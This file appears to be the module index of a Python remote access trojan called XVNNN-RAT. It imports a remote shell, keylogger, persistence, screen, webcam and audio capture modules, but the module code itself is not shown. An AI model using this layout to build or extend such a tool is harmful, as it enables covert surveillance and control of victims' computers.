"""
XVNNN-RAT Modules
Author: Ali Zafar (alizafarbati@gmail.com)
"""

from .shell import ShellModule
from .filemanager import FileManagerModule
from .screen import ScreenModule
from .systeminfo import SystemInfoModule
from .keylogger import KeyloggerModule
from .process import ProcessModule
from .network import NetworkModule
from .persistence import PersistenceModule
from .webcam import WebcamModule
from .audio import AudioModule

__all__ = [
    "ShellModule",
    "FileManagerModule",
    "ScreenModule",
    "SystemInfoModule",
    "KeyloggerModule",
    "ProcessModule",
    "NetworkModule",
    "PersistenceModule",
    "WebcamModule",
    "AudioModule",
]
